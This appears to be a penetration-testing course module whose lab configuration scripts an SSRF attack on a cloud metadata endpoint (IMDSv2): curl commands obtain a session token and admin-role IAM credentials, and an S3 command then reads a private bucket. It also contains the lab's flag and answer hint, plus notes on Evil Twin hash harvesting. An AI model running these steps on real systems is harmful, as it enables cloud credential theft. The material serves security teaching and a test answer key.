---
id: mod-pt-504
track_id: track-pentest
slug: hybrid-cloud-imds-iam-wireless-zero-trust
title: '504: Hybrid Cloud (IMDSv2 & IAM), Wireless & Zero Trust Architecture'
difficulty: Advanced
order_index: 20
estimated_minutes: 35
lab_type: terminal
lab_briefing: Target 192.168.1.15 runs an internal webhook proxy capable of sending custom HTTP request headers. (1) Issue a PUT request to the link-local IMDS endpoint (169.254.169.254) to generate an IMDSv2 session token, (2) retrieve the temporary IAM credentials for hybrid-cloud-admin-role, and (3) query the private S3 vault to extract the cloud flag.
expected_flag: FLAG{HYBRID_CLOUD_IMDSV2_S3_VAULT_PWNED}
hint: Execute the AWS CLI S3 download command using the extracted credentials to capture FLAG{HYBRID_CLOUD_IMDSV2_S3_VAULT_PWNED}.
lab_config:
  target_ip: 192.168.1.15 -> 169.254.169.254 (IMDSv2)
  quick_commands:
    - 'curl -s -X PUT "http://192.168.1.15:8080/proxy?method=PUT&url=http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"'
    - 'curl -s -X GET "http://192.168.1.15:8080/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/hybrid-cloud-admin-role" -H "X-aws-ec2-metadata-token: AQAEAP99z...token"'
    - aws s3 cp s3://sevenkingdoms-crown-vault/vault_flag.txt - --endpoint-url http://172.16.50.25:9000
  commands:
    'curl -s -X PUT "http://192.168.1.15:8080/proxy?method=PUT&url=http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"': AQAEAP99z_EXAMPLE_IMDSV2_SESSION_TOKEN_88214==
    'curl -s -X GET "http://192.168.1.15:8080/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/hybrid-cloud-admin-role" -H "X-aws-ec2-metadata-token: AQAEAP99z...token"': |-
      {
        "Code": "Success",
        "AccessKeyId": "ASIAQPRODEXAMPLE2026",
        "SecretAccessKey": "K9zLmPqR3tYwZ1aBcDeFgHiJkLmNoPqRsTuVwX",
        "Token": "IQoJb3JpZ2luX2VjE...",
        "RoleArn": "arn:aws:iam::123456789012:role/hybrid-cloud-admin-role"
      }
    aws s3 cp s3://sevenkingdoms-crown-vault/vault_flag.txt - --endpoint-url http://172.16.50.25:9000: |-
      # Seven Kingdoms Secure Cloud Object Storage Drop
      FLAG{HYBRID_CLOUD_IMDSV2_S3_VAULT_PWNED}
---

# 504: Hybrid Cloud (IMDSv2 & IAM), Wireless & Zero Trust Architecture

## Sub-Unit 17.1: Cloud Metadata Services (IMDSv1 vs. IMDSv2)

In hybrid-cloud environments, on-premises applications often interact with cloud infrastructure (AWS, Azure, GCP).
- **IMDSv1**: Accessible via simple GET request to the link-local address (`http://169.254.169.254/latest/meta-data/iam/security-credentials/`), making it vulnerable to Server-Side Request Forgery (SSRF).
- **IMDSv2**: Enforces session tokens via an initial `PUT` request with the `X-aws-ec2-metadata-token-ttl-seconds` header. SSRF vulnerabilities that support custom headers can generate a token and extract temporary IAM credentials.

## Sub-Unit 17.2 & 17.3: Wireless & Zero Trust Evaluation

Modern enterprise perimeters integrate additional boundaries:
- **WPA2-Enterprise vs. WPA3**: WPA2-Enterprise relies on 802.1X RADIUS authentication. Rogue access point simulations (Evil Twin / Hostapd-WPE) attempt to harvest MSCHAPv2 challenge-response hashes from connecting clients.
- **Zero Trust Architecture**: Penetration testers audit whether internal network traffic is continuously verified through device posture checks, mutual TLS (mTLS), and strict micro-segmentation rather than relying on perimeter firewalls.
